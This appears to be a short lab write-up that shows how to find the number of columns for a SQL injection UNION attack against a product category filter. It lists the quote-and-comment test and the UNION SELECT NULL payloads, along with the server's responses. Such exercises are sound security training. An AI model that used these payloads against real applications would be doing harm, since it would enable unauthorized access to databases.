# SQL injection, determining the number of columns returned by the query

### Goal:
`Get the application to return an additional row that contains null values`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`

<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`<br><br>

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

category='UNION SELECT NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL,NULL--

`200`

This means that the database returns three columns.

